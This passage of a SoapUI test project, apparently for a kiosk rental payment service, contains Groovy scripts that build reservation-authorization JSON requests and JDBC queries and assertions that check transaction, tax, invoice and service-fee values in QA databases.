} else if (rentalCount > 0 && purchaseCount > 0) {
	requestPayload += "$rentalPayload,$purchasePayload";
} else {
	log.info("No rental or purchase information generated!");
}
requestPayload += "],";
requestPayload += "\"Discounts\": [$discountPayload]";
requestPayload += "$serviceFeePayload";
requestPayload += "}} ";

// log to soapui log
log.info("ResvAuth Request: $requestPayload");

// url encode json string
result = "payload=" + URLEncoder.encode(requestPayload)
testRunner.testCase.setPropertyValue("RequestBody",result)
//testRunner.testCase.setPropertyValue("ReconcileGUID",MessageId.toString()); //For MessageControl Validations

def justBuildRequest = context.expand( '${#TestCase#justBuildRequest}');
if (justBuildRequest == 'true')
{
	log.info ("No Resv Authorize, skip to ***");
	testRunner.gotoStepByName("ResvAuth Completed");
}
else
{
	//Run Auth
}]]></script></con:config></con:testStep><con:testStep type="httprequest" name="ResvAuth (Request)" id="e574d3ce-65d3-4038-83fa-0c97330cda60"><con:settings/><con:config method="POST" xsi:type="con:HttpRequest" name="ResvAuth (Request)" postQueryString="false" mediaType="application/x-www-form-urlencoded" id="b2fa5210-dde2-4787-8c9d-57bcd781cdfc" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:settings><con:setting id="com.eviware.soapui.impl.wsdl.WsdlRequest@request-headers">&lt;xml-fragment/></con:setting></con:settings><con:endpoint>${#Project#KSEndpoint}</con:endpoint><con:request>${#TestCase#RequestBody}</con:request><con:assertion type="GroovyScriptAssertion" name="Check for Success and HasErrors" id="70bc7102-0d46-4704-81fc-09b7237cee25"><con:configuration><scriptText>def response = URLDecoder.decode(messageExchange.getResponseContent())
log.info ("ResvAuth Response: $response")
	assert response.contains("\"Success\":true,")
	assert response.contains("\"HasErrors\":false,")

</scriptText></con:configuration></con:assertion><con:credentials><con:selectedAuthProfile>Basic</con:selectedAuthProfile><con:addedBasicAuthenticationTypes>Basic</con:addedBasicAuthenticationTypes><con:authType>No Authorization</con:authType></con:credentials><con:jmsConfig JMSDeliveryMode="PERSISTENT"/><con:jmsPropertyConfig/><con:parameters/><con:environmentSpec><con:entry environmentId="088f2c6b-5bf5-4b7a-aea1-4ebec9f3aa3a"><con:authProfile>Basic</con:authProfile></con:entry><con:entry environmentId="bff3f14b-e680-473b-bba1-89a50bc86a72"><con:authProfile>Basic</con:authProfile></con:entry></con:environmentSpec></con:config></con:testStep><con:testStep type="groovy" name="Save ResvAuth Response" id="8e4037c0-4949-426f-bf5e-3b7bd1c04951" disabled="true"><con:settings/><con:config><script>import groovy.json.JsonSlurper
def encodedBody = testRunner.testCase.getTestStepByName('ResvAuth (Request)').getPropertyValue('Response');
//log.info(encodedBody);
def decodedBody = URLDecoder.decode(encodedBody);
//log.info("AuthResponse:$decodedBody");
def list = new JsonSlurper().parseText( decodedBody );
def TransactionID = list.get('ReferenceNumber');
log.info('Transaction_ID = ' + list.get('ReferenceNumber'))
testRunner.testCase.setPropertyValue("TransactionID",list.get('ReferenceNumber').toString());

//Define the Db Connection
import groovy.sql.*;
// Below line will create an object of the already created JDBC connection.
def ConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('MerchantService');
def constring = ConObj.getConnectionString();
//Define the Connection
def sql = Sql.newInstance(constring);

def getInvoiceDetails = sql.firstRow("Select max(OID) AS ID from Invoice Where ReferenceNumber = '$TransactionID'");
def InvoiceId = getInvoiceDetails.ID;
testRunner.testCase.setPropertyValue("InvoiceID",InvoiceId.toString());</script></con:config></con:testStep><con:testStep type="jdbc" name="Check Transaction" id="c2177bd8-86e5-4be7-a9f0-918ae4c0d6cf"><con:settings><con:setting id="prettyPrintResponse">true</con:setting></con:settings><con:config xsi:type="con:JdbcRequestTestStep" convertColumnNamesToUpperCase="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dbConnectionName>RedboxServerDB</con:dbConnectionName><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB100.rb.local:1433;databaseName=RedboxServerDB;integratedSecurity=true;</con:connectionString><con:password>t</con:password><con:connectionProperties/><con:query>SELECT 
	transaction_id,
	kioskclient_id,
	promotioncode,
	promotionvalue,
	transaction_status,
	rent_date,
	approvalcode,
	invoiceid,
	amount,
	isoffline,
	rentaltype,
	authamount,
	subtotal,
	discountedsubtotal,
	salestaxamount,
	grandtotal,
	billingtypeid,
	rentaltaxrate,
	purchasetaxrate,
	rentaltaxamount,
	purchasetaxamount,
	shoppingcarttype,
	optintypeID,
	cpCustomerNumber,
	ServiceFee,
	ServiceFeeTaxAmount
FROM
	[Transaction](nolock)
WHERE 
	transaction_id = :TnxId
</con:query><con:storedProcedure>false</con:storedProcedure><con:assertion type="Simple Contains" name="Contains ApprovalCode" id="b6c88e9c-d6aa-482f-a3cf-28de7d50e88c"><con:configuration><token>Approved</token><ignoreCase>false</ignoreCase><useRegEx>false</useRegEx></con:configuration></con:assertion><con:assertion type="GroovyScriptAssertion" name="Check BillingType" id="3d102727-0107-496f-9f31-2aec87ad4ec2" disabled="true"><con:configuration><scriptText>//import groovy.json.JsonSlurper

def groovyUtils = new com.eviware.soapui.support.GroovyUtils( context )
def holder = groovyUtils.getXmlHolder( "Check Transaction#ResponseAsXml");
int actualBillingTypeID = holder.getNodeValue("//BILLINGTYPEID[1]").toInteger();

def numrentals = context.expand( '${#TestCase#RentalCount}' ).toInteger();
def numpurchases = context.expand( '${#TestCase#PurchaseCount}' ).toInteger();
//Added if and else logic for PRM and PRG functionality.
if (numrentals > 0 &amp;&amp; numpurchases > 0)
{
	assert actualBillingTypeID == 6; //Because of PRM and PRG functionality.
}
else
{
	assert actualBillingTypeID == 7;
}

/* DISABLED THE ASSERTION BASED ON COLLECTION METHOD
else
{
	// if collection method is 1 or 2, billing type 6, collection method 4 or 6 = billing type 7
	if (context.expand( '${#TestSuite#collectionmethod}' ).toInteger() == 1)
		assert actualValue == 6
	else if (context.expand( '${#TestSuite#collectionmethod}' ).toInteger() == 2)
		assert actualValue == 6
	else if (context.expand( '${#TestSuite#collectionmethod}' ).toInteger() == 4)
		assert actualValue == 7
	else if (context.expand( '${#TestSuite#collectionmethod}' ).toInteger() == 6)
		assert actualValue == 7
	else
		assert 0 == 1
}
 */</scriptText></con:configuration></con:assertion><con:assertion type="GroovyScriptAssertion" name="Check Amounts" id="62dae791-ac46-4245-b0bd-42288e2bb164" disabled="true"><con:configuration><scriptText>import java.text.DecimalFormat;
Round4 = new DecimalFormat("#.####");

//Get Rental Count
def numRentals = context.expand( '${#TestCase#RentalCount}' ).toBigDecimal();
def numPurchases = context.expand( '${#TestCase#PurchaseCount}' ).toBigDecimal();
def HasPhysicalPurchase = context.expand( '${#TestCase#HasPhysicalPurchase}' );

//Get the actual values from JDBC response
def groovyUtils = new com.eviware.soapui.support.GroovyUtils( context )
def holder = groovyUtils.getXmlHolder( "Check Transaction#ResponseAsXml");
def actualRentalTaxAmount = holder.getNodeValue("//RENTALTAXAMOUNT[1]").toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP);
def actualPurchaseTaxAmount = holder.getNodeValue("//PURCHASETAXAMOUNT[1]").toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP);
def actualRentalTaxRate = holder.getNodeValue("//RENTALTAXRATE[1]").toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP);
def actualPurchaseTaxRate = holder.getNodeValue("//PURCHASETAXRATE[1]").toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP);
def actualGrandTotal = holder.getNodeValue("//GRANDTOTAL[1]").toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP);
def actualDiscountedSubTotal = holder.getNodeValue("//DISCOUNTEDSUBTOTAL[1]").toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP);
def actualSubTotal = holder.getNodeValue("//SUBTOTAL[1]").toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP);
def actualAuthAmount = holder.getNodeValue("//AUTHAMOUNT[1]").toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP);
def actualPromotionValue = holder.getNodeValue("//PROMOTIONVALUE[1]").toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP);
def actualSalesTaxAmount = holder.getNodeValue("//SALESTAXAMOUNT[1]").toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP);
def actualShoppingCartType = holder.getNodeValue("//SHOPPINGCARTTYPE[1]").toInteger();
def actualRentalType = holder.getNodeValue("//RENTALTYPE[1]").toInteger();
def actualIsOffline = holder.getNodeValue("//ISOFFLINE[1]").toInteger();

//Get the expected values from TestCase properties; calculated in "Encoded Message Body (Authorize)"
def expectedRentalTaxAmount = context.expand( '${#TestCase#RentalTaxAmount}' ).toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP);
def expectedPurchaseTaxAmount = context.expand( '${#TestCase#PurchaseTaxAmount}' ).toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP);
def expectedRentalTaxRate = context.expand( '${#TestCase#RentalTaxRate}' ).toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP);
def expectedPurchaseTaxRate = context.expand( '${#TestCase#PurchaseTaxRate}' ).toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP);
def expectedDigitalPurchaseTaxRate = context.expand( '${#TestCase#DigitalPurchaseTaxRate}' ).toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP);
def expectedGrandTotal = context.expand( '${#TestCase#TransactionTotal}' ).toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP);
def expectedDiscountedSubTotal = context.expand( '${#TestCase#DiscountedSubTotal}' ).toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP);
def expectedSubTotal = context.expand( '${#TestCase#SubTotal}' ).toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP);
def expectedPromotionValue = context.expand( '${#TestCase#PromoValue}' ).toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP);
def expectedSalesTaxAmount = (expectedRentalTaxAmount + expectedPurchaseTaxAmount).toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP);

//Validations
// rental type is 1 if online and 2 if offline (3 is web)
assert (actualRentalType == 1);
assert (actualIsOffline == 0);
assert (actualDiscountedSubTotal == expectedDiscountedSubTotal);
assert (actualGrandTotal == expectedGrandTotal);
assert (actualSubTotal == expectedSubTotal);
assert (actualAuthAmount == expectedGrandTotal);
assert (actualPromotionValue == expectedPromotionValue);
assert (actualSalesTaxAmount == expectedSalesTaxAmount);
//amounts will be 0 if there were none of that type
if (numRentals == 0) 
{
	assert actualRentalTaxAmount.toBigDecimal() == 0;
	assert actualRentalTaxRate == 0;
} 
else 
{
	assert actualRentalTaxAmount.toBigDecimal() == expectedRentalTaxAmount.toBigDecimal();
	assert actualRentalTaxRate == expectedRentalTaxRate;	
}
//amounts will be 0 if there were none of that type
if (numPurchases == 0) 
{
	assert actualPurchaseTaxAmount.toBigDecimal() == 0;
	assert actualPurchaseTaxRate == 0;
} 
else 
{
	assert actualPurchaseTaxAmount.toBigDecimal() == expectedPurchaseTaxAmount.toBigDecimal();
	if (HasPhysicalPurchase == 'true')
	{
		assert actualPurchaseTaxRate == expectedPurchaseTaxRate;
	}
	else
	{
		assert actualPurchaseTaxRate == expectedDigitalPurchaseTaxRate;
	}
	
}
// 1 = only rentals, 2 = only purchases, 3 = both
if (numRentals > 0 &amp;&amp; numPurchases == 0)
	assert actualShoppingCartType == 1
else if (numRentals == 0 &amp;&amp; numPurchases > 0)
	assert actualShoppingCartType == 2
else
	assert actualShoppingCartType == 3
	</scriptText></con:configuration></con:assertion><con:assertion type="XPath Match" id="6d8ac62a-fe7e-4618-977f-63861f2c2f20" name="Match content of [TRANSACTION_STATUS]"><con:configuration><path>//Results[1]/ResultSet[1]/Row[1]/TRANSACTION_STATUS[1]/text()</path><content>2</content><allowWildcards>false</allowWildcards><ignoreNamspaceDifferences>false</ignoreNamspaceDifferences><ignoreComments>false</ignoreComments></con:configuration></con:assertion><con:assertion type="XPath Match" id="d1b45fee-cd43-4f09-b272-367adbe8f895" name="Match content of [KIOSKCLIENT_ID]"><con:configuration><path>//Results[1]/ResultSet[1]/Row[1]/KIOSKCLIENT_ID[1]/text()</path><content>${#TestCase#KioskId}</content><allowWildcards>false</allowWildcards><ignoreNamspaceDifferences>false</ignoreNamspaceDifferences><ignoreComments>false</ignoreComments></con:configuration></con:assertion><con:assertion type="GroovyScriptAssertion" id="9f988f0b-54b8-4bed-9fd9-9cf3a9dce0b7" name="ServiceFee - Validations"><con:configuration><scriptText>import java.text.DecimalFormat;
Round4 = new DecimalFormat("#.####");
def enableServiceFee = context.expand( '${#TestCase#EnableServiceFee}' )
def groovyUtils = new com.eviware.soapui.support.GroovyUtils( context )
def holder = groovyUtils.getXmlHolder( "Check Transaction#ResponseAsXml");
def actualAuthAmount = holder.getNodeValue("//AMOUNT[1]").toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP);
def actualServiceFee = holder.getNodeValue("//SERVICEFEE[1]")
if (enableServiceFee == 'true' &amp;&amp; actualAuthAmount > 0)
{	
	def serviceFeeAmount = context.expand( '${#TestCase#ServiceFeeAmount}' ).toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP)
	assert (actualServiceFee.toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP) == serviceFeeAmount.toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP));
}
else
{
	assert (actualServiceFee == null);
}</scriptText></con:configuration></con:assertion><con:properties><con:property><con:name>TnxId</con:name><con:value>${#TestCase#TransactionID}</con:value></con:property></con:properties></con:config></con:testStep><con:testStep type="jdbc" name="Check AmountBase" id="7e675477-782b-4e63-9eba-a307f413d740" disabled="true"><con:settings><con:setting id="prettyPrintResponse">true</con:setting></con:settings><con:config xsi:type="con:JdbcRequestTestStep" convertColumnNamesToUpperCase="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dbConnectionName>MerchantService</con:dbConnectionName><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB102.rb.local:1433;databaseName=MerchantService;integratedSecurity=true</con:connectionString><con:password>tes</con:password><con:connectionProperties/><con:query>SELECT 
	sum(amountbase) as totalAmountBase
FROM
	[InvoiceItem]
WHERE 
	Invoice = :InvoiceID
AND
	label = 1</con:query><con:assertion type="GroovyScriptAssertion" id="859a2ef5-91d6-4cb1-aecf-9b4c52dd67ec" name="Script Assertion"><con:configuration><scriptText>import java.text.DecimalFormat;
//Round4 = new DecimalFormat("#.####");

def groovyUtils = new com.eviware.soapui.support.GroovyUtils( context );
def holder = groovyUtils.getXmlHolder( "Check AmountBase#ResponseAsXml");
def actualAmountBase = holder.getNodeValue("//TOTALAMOUNTBASE[1]").toBigDecimal().setScale(2, BigDecimal.ROUND_HALF_UP);
def expectedAmountBase = context.expand( '${#TestCase#TransactionTotal}' ).toBigDecimal().setScale(2, BigDecimal.ROUND_HALF_UP);

assert (actualAmountBase == expectedAmountBase);</scriptText></con:configuration></con:assertion><con:properties><con:property><con:name>InvoiceID</con:name><con:value>${#TestCase#InvoiceID}</con:value></con:property></con:properties></con:config></con:testStep><con:testStep type="jdbc" name="Check Invoice Details" id="aba8cdf0-125f-4990-a88f-b69f288a64f1" disabled="true"><con:settings><con:setting id="prettyPrintResponse">true</con:setting></con:settings><con:config xsi:type="con:JdbcRequestTestStep" convertColumnNamesToUpperCase="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dbConnectionName>MerchantService</con:dbConnectionName><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB102.rb.local:1433;databaseName=MerchantService;integratedSecurity=true</con:connectionString><con:password>tes</con:password><con:connectionProperties/><con:query>SELECT TOP 1
	i.[Status], 
	i.[System], 
	i.CreatedBy, 
	i.StoreNumber,
	i.CollectionMethod,
	ii.[Status]
FROM
	[Invoice] i (nolock)
INNER JOIN [InvoiceItem] ii ON i.OID = ii.Invoice
WHERE 
	i.OID = :InvoiceID</con:query><con:assertion type="XPath Match" id="240a02f9-cf29-49b8-bec1-b5f1e1e60717" name="Invoice Status"><con:configuration><path>//Results[1]/ResultSet[1]/Row[1]/STATUS[1]/text()</path><content>0</content><allowWildcards>false</allowWildcards><ignoreNamspaceDifferences>false</ignoreNamspaceDifferences><ignoreComments>false</ignoreComments></con:configuration></con:assertion><con:assertion type="XPath Match" id="efcc78e9-3208-4611-b3d8-4fbdcd0ddd89" name="Match content of [SYSTEM]"><con:configuration><path>//Results[1]/ResultSet[1]/Row[1]/SYSTEM[1]/text()</path><content>Rental Systems</content><allowWildcards>false</allowWildcards><ignoreNamspaceDifferences>false</ignoreNamspaceDifferences><ignoreComments>false</ignoreComments></con:configuration></con:assertion><con:assertion type="XPath Match" id="96905afe-9a46-4b0b-9840-dfdfb72b774e" name="Match content of [CREATEDBY]"><con:configuration><path>//Results[1]/ResultSet[1]/Row[1]/CREATEDBY[1]/text()</path><content>RB\KioskSvc_01_U</content><allowWildcards>false</allowWildcards><ignoreNamspaceDifferences>false</ignoreNamspaceDifferences><ignoreComments>false</ignoreComments></con:configuration></con:assertion><con:assertion type="XPath Match" id="3c2f7519-7ffa-408a-b2e2-fd6ce8cd05da" name="InvoiceItem Status"><con:configuration><path>//Results[1]/ResultSet[1]/Row[1]/STATUS[2]/text()</path><content>2</content><allowWildcards>false</allowWildcards><ignoreNamspaceDifferences>false</ignoreNamspaceDifferences><ignoreComments>false</ignoreComments></con:configuration></con:assertion><con:assertion type="GroovyScriptAssertion" id="4207b007-8259-4190-b87f-c52ed3829198" name="Script Assertion"><con:configuration><scriptText>import java.text.DecimalFormat;
//Round4 = new DecimalFormat("#.####");

def groovyUtils = new com.eviware.soapui.support.GroovyUtils( context );
def invholder = groovyUtils.getXmlHolder( "Check Invoice Details#ResponseAsXml");
def actualCollectionMethod = invholder.getNodeValue("//COLLECTIONMETHOD[1]").toInteger();

//Get the shopping cart type value from Get Transaction test step.
def tnxHolder = groovyUtils.getXmlHolder( "Check Transaction#ResponseAsXml");
def shoppingCartType = tnxHolder.getNodeValue("//SHOPPINGCARTTYPE[1]").toInteger();

//based on config in QADB100.RedboxServerDB.dbo.KioskBillingConfig table
if (shoppingCartType == 3)
{
	assert actualCollectionMethod == 3;
}
else
{
	assert actualCollectionMethod == 6;
}
</scriptText></con:configuration></con:assertion><con:properties><con:property><con:name>InvoiceID</con:name><con:value>${#TestCase#InvoiceID}</con:value></con:property></con:properties></con:config></con:testStep><con:testStep type="groovy" name="ResvAuth Completed" id="e12a8de0-8e34-4226-889a-c066d67ad90f"><con:settings/><con:config><script/></con:config></con:testStep><con:testStep type="groovy" name="Copy of Encode Message Body (ResvAuth)" id="e07cd0cd-1fa0-4709-b14f-575408a4059f" disabled="true"><con:settings/><con:config><script><![CDATA[//NOTES: Disabled extra logging; no need to delete them. 
import java.util.Date
import java.util.Calendar
import java.text.DecimalFormat;
import com.eviware.soapui.model.testsuite.TestRunner.Status;
Round16 = new DecimalFormat("#.################"); //Rounding the amount to 16 decimals.
Round2 = new DecimalFormat("#.####"); //Rounding the amount to 2 decimals.
//Define the Db Connection
import groovy.sql.*;
// Below line will create an object of the already created JDBC connection.
def ConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('RedboxServerDB');
def constring = ConObj.getConnectionString();
//Define the Connection
def sql = Sql.newInstance(constring);

//Get CreditCard Info
def encryptCC = testRunner.testCase.testSuite.project.testSuites["Generic Steps (Others)"].testCases["Generate Encrypted CCInfo"];
def KeyID = encryptCC.getPropertyValue("KeyID");
def CardID = encryptCC.getPropertyValue("CardID");
def EncryptedNumber = encryptCC.getPropertyValue("EncryptedNumber");
def EncryptedTrack2 = encryptCC.getPropertyValue("EncryptedTrack2");
def lastFour = encryptCC.getPropertyValue("CardNumber").reverse().take(4).reverse();
def CardType = encryptCC.getPropertyValue("CardType");
//log.info ("KeyID:$KeyID; CardID:$CardID; EncryptedNumber:$EncryptedNumber; EncryptedTrack2:$EncryptedTrack2");
ccPayload = ""
ccPayload += "\"CreditCard\": {";
ccPayload += "\"FirstName\": \"Redbox\",";
ccPayload += "\"LastName\": \"Server\",";
ccPayload += "\"Number\": \"$EncryptedNumber\",";
ccPayload += "\"PostalCode\": \"60181\",";
ccPayload += "\"ExpirationMonth\": \"12\",";
ccPayload += "\"ExpirationYear\": \"20\",";
ccPayload += "\"KeyId\": $KeyID,";
ccPayload += "\"CardId\": \"$CardID\",";
ccPayload += "\"LastFour\": \"$lastFour\",";
ccPayload += "\"CardType\": $CardType,";
ccPayload += "\"Track2\": \"$EncryptedTrack2\"";
ccPayload += "},";
testRunner.testCase.setPropertyValue("CCPayload", ccPayload);

//Get hard coded disc prices and non-return days
def dvdPrice = context.expand( '${#TestSuite#DVDPrice}' );
def blurayPrice = context.expand( '${#TestSuite#BlurayPrice}' );
def gamePrice = context.expand( '${#TestSuite#GamePrice}' );
def dvdNonReturnDays = context.expand( '${#TestSuite#DVDNonReturnDays}' );
def blurayNonReturnDays = context.expand( '${#TestSuite#BlurayNonReturnDays}' );
def gameNonReturnDays = context.expand( '${#TestSuite#GameNonReturnDays}' );
def purchasePrice = context.expand( '${#TestSuite#PurchasePrice}' );
def digitalCodePrice = context.expand( '${#TestSuite#DigitalCodePrice}' );
def KioskId= context.expand( '${#TestCase#KioskId}' );

//Service Fee
def enableServiceFee = context.expand( '${#TestCase#EnableServiceFee}');
def serviceFeeTaxRate = context.expand( '${#TestCase#ServiceFeeTaxRate}');
def serviceFeeAmount = context.expand( '${#TestCase#ServiceFeeAmount}');

//Calculate Nonreturn price
def dvdNonreturnPrice = (dvdPrice.toBigDecimal() * dvdNonReturnDays.toBigDecimal());
def blurayNonreturnPrice = (blurayPrice.toBigDecimal() * blurayNonReturnDays.toBigDecimal());
def gameNonreturnPrice = (gamePrice.toBigDecimal() * gameNonReturnDays.toBigDecimal());
log.info ("dvdNonreturnPrice: $dvdNonreturnPrice; blurayNonreturnPrice: $blurayNonreturnPrice; gameNonreturnPrice: $gameNonreturnPrice");

//Get Disc Info
def getDisctc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (Others)"].testCases["GetDiscs"];

//Cleaning up the properties; set the values to NULL before the start
for(int j=0;j<getDisctc.getPropertyCount();j++)
{
   getDisctc.getPropertyAt(j).setValue("");
}
//BUILD THE RENTAL and PURCHASE PAYLOAD:
//Grab the barcodes, and product types; build the lists. 

//Rental
allBarcodes = [];
allTitleIds = [];
rentalBarcodes = [];
rentalTitleIds = [];
rentalProductFamily = [];
rentalProductType = [];
rentalDiscPrice = [];
rentalNonReturnPrice = [];
rentalNonReturnDays = [];
loyaltyProductId = [];
loyaltyProductPrice = [];
loyaltyPoints = [];
promoProductId = [];
promoProductPrice = [];
nonLoyaltyProductId = [];
nonLoyaltyProductPrice = [];
redemptionPoints = [];
discountedProductId = []; //For Assertions.
discountedProductPrice = []; //For Assertions.

//Purchase
purchaseBarcodes = [];
purchaseProductFamily = [];
purchaseProductType = [];
purchaseDiscPrice = [];
purchaseTitleIds = [];

//Payload building and Amount Calculations
//Rental Items Payload
rentalPayload = "{\"GroupType\" : 1,  \"Items\" : [";
BigDecimal rentalTotal = 0;
int rentalCount = 0;
//Purchase Items Payload
purchasePayload = "{\"GroupType\" : 2,  \"Items\" : [";
BigDecimal purchaseTotal = 0;
BigDecimal digitalTotal = 0;
int purchaseCount = 0;

BigDecimal SubTotal = 0;
BigDecimal DiscountedSubTotal = 0;
BigDecimal EstimatedLoyaltyAmount = 0;
BigDecimal TotalCartAmount = 0;//Total of Rental and Purchase Amount
BigDecimal remainingPromoValue = 0;

serviceFeePayload = ""; //ServiceFee Payload
promoPayload = ""; //Promo Code payload
loyaltyPayload = ""; //Loyalty points payload
requestPayload = ""; //Total payload rental + purchase + promo + loyalty

//Creating a Boolean
HasPhysicalPurchase = 'false';
testRunner.testCase.setPropertyValue("HasPhysicalPurchase",HasPhysicalPurchase);

//Get to-do Rental info
def numAddRentals = Eval.me("[" + context.expand( '${#TestCase#numOfRentals}' ) + "]");
def numAddPurchases = Eval.me("[" + context.expand( '${#TestCase#numOfPurchases}' ) + "]");
def PromoCode = context.expand( '${#TestCase#PromoCode}');
BigDecimal discountvalue = (context.expand( '${#TestCase#PromoValue}' ).toBigDecimal()); //PromoCode Value
def rentalFormatIds = context.expand( '${#TestCase#rentalFormats}' );
def purchaseFormatIds = context.expand( '${#TestCase#PurchaseFormats}' );
def loyaltyFlag = context.expand( '${#TestCase#LoyaltyFlag}' );
def CustomerProfileNumber = context.expand( '${#TestCase#CustomerProfileNumber}' );

rentalformatIDList = rentalFormatIds.split(",");
purchaseformatIDList = purchaseFormatIds.split(",");

loyaltyFlagList = loyaltyFlag.split(",");

int numberOfLoyaltyFlags = Eval.me("[" + loyaltyFlag + "]").count {it == 1};

//TO-DO STILL THERE IS A FLAW IN THIS LOGIC. NEED TO FIGURE OUT THE SOLUTION.
//Purpose: If datasource says rent Dvd, Bluray and provide quantity for only Dvd and not for Bluray; currently it fail with array out of bound error.
//For Rentals
if (rentalformatIDList.size() != numAddRentals.size())
{
    def difference = (rentalformatIDList.size() - numAddRentals.size())
     for (di = 0; di < difference; di++)
     {
         numAddRentals.add('1') //if the size is different add the default to 1; tried to make it 0; but json was building wrong with extra ,(comma). TO-DO: Fix that issue.
     }
}
else
{
     //nothing to do, code looks good
}
//For Purchases
if (purchaseformatIDList.size() != numAddPurchases.size())
{
    def difference = (purchaseformatIDList.size() - numAddPurchases.size())
     for (di = 0; di < difference; di++)
     {
         numAddPurchases.add('1') //if the size is different add the default to 1
     }
}
else
{
     //nothing to do, code looks good
}

//Prepare the final list
numAddRentalsList = numAddRentals.toString().replaceAll("\\[","").replaceAll("\\]","").split(",");
numAddPurchasesList = numAddPurchases.toString().replaceAll("\\[","").replaceAll("\\]","").split(",");
log.info ("numAddRentalsList: $numAddRentalsList; rentalformatIDList: $rentalformatIDList");
log.info ("numAddPurchasesList: $numAddPurchasesList; purchaseformatIDList: $purchaseformatIDList");
if ((rentalFormatIds == '0') || (rentalFormatIds == '') || (rentalFormatIds == 'null'))
{
	log.info ("No Rentals in the transaction");
	getDisctc.setPropertyValue('ExcludeRentalTitles', '0');
	getDisctc.setPropertyValue('ExcludePurchaseTitles', '0');
	testRunner.testCase.setPropertyValue('RentalCount', rentalCount.toString());
	testRunner.testCase.setPropertyValue("RentalTaxAmount", '0');
	testRunner.testCase.setPropertyValue("HasPromoDiscount","0");
	testRunner.testCase.setPropertyValue("HasLoyaltyDiscount","0");
}
else
{
	//Will Run the GetDiscs TestCase; and categorize all the formats required for the transaction and save it at GetDisc testCase property level.
	for (r = 0; r < rentalformatIDList.size(); r++)
	{
	    curformatID = rentalformatIDList[r].toString().trim();
	    //log.info ("curformatID: $curformatID");
	    def getFormatName = sql.firstRow("select FormatName AS OID from Format where FormatID = $curformatID");
	    def FormatName = (getFormatName.OID);     
	    getDisctc.setPropertyValue('FormatID', curformatID);
	    getDisctc.setPropertyValue('FormatName', FormatName);  
	    getDisctc.setPropertyValue('KioskID',KioskId);  
	    //Manually Hardcoded to some value so that SQL query doesnot fail in GetDiscs test Case.  
	    getDisctc.setPropertyValue('ExcludeRentalTitles', '0');    
	    getDisctc.setPropertyValue('ExcludePurchaseTitles', '0');  
	    
	    //Run the test case: GetRecoDiscs
	    def runGetDiscs = getDisctc.run( null, false );
	        
	    // show that it worked out ok
	    log.info("Status: $runGetDiscs.status, time taken for TestCase : [Get Discs] For $FormatName was: $runGetDiscs.timeTaken ms");
	        
	    // assert that it didn't fail
	    assert runGetDiscs.status != Status.FAILED : runGetDiscs.reason
	}
	//Will Grab one format a time to build the request.
	for (f = 0; f < rentalformatIDList.size(); f++)
	{
	    curformatID = rentalformatIDList[f].toString().trim();
	    def getFormatName = sql.firstRow("select FormatName, FormatTypeID from Format where FormatID = $curformatID");
	    def FormatName = (getFormatName.FormatName);
	    def formatTypeID = (getFormatName.FormatTypeID.toString());
	    
	    //Get FormatTypeName from FormatIypeID
	    def excuteFormatType = sql.firstRow("Select FormatTypeName from FormatType Where FormatTypeID = $formatTypeID");
	    def formatTypeName = (excuteFormatType.FormatTypeName.toString());
	    def getBarcode = getDisctc.getPropertyValue("$FormatName-Barcodes");
	    def getTitleIDs = getDisctc.getPropertyValue("$FormatName-Titles");    
	    log.info ("getBarcode-$FormatName: $getBarcode");
	    getBarcodeList = getBarcode.split(",");
	    getTitleList = getTitleIDs.split(",");
	    numOfBarcodes = numAddRentalsList[f].toString().trim();
	    log.info ("numOfBarcodes: $numOfBarcodes; FormatName: $FormatName");	
	    //Create a payload for rental items; barcodes are grabed from the GetDiscs testcase property. 
	    for (b = 0; b < numOfBarcodes.toInteger(); b++)
	    {
	        curBarcodeID = getBarcodeList[b].toString().trim();
	        curTitleID = getTitleList[b].toString().trim();
	        
	        rentalPayload += "{"
	        rentalPayload += "\"ProductId\" : $curTitleID,"
	        rentalPayload += "\"Barcode\" : \"$curBarcodeID\","
	        rentalPayload += "\"VendStatus\" : 28," //To-DO
	        rentalPayload += "\"ProductFamily\" : \"$formatTypeName\","
	        rentalPayload += "\"ProductType\" : \"$FormatName\","
	        rentalPayload += "\"MultiDisc\" : false,"
	        rentalPayload += "\"Pricing\" : {"
	        if (curformatID == '1') //For DVD
	        {
			rentalPayload += "\"InitialNight\" : $dvdPrice,"
			rentalPayload += "\"ExtraNight\" : $dvdPrice,"
			rentalPayload += "\"NonReturn\" : $dvdNonreturnPrice,"
			rentalPayload += "\"Expiration\" : $dvdPrice,"
			rentalPayload += "\"NonReturnDays\" : $dvdNonReturnDays,"
